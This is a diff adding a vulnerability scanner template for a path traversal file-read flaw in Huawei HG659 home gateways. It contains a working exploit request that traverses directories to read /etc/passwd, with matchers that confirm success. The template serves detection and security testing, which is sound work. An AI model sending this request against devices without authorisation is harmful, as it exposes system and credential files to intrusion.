@@ -1,0 +1,32 @@
+id: huawei-hg659-fileread
+
+info:
+  name: Huawei Home Gateway HG659 File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for a file read vulnerability in Huawei HG659 home gateway devices. It can read sensitive files like `/etc/passwd`.
+  tags: file-read
+  reference:
+    - https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4210
+
+variables:
+  file: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /lib///....//....//....//....//....//....//....//....{{file}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - ":/bin"
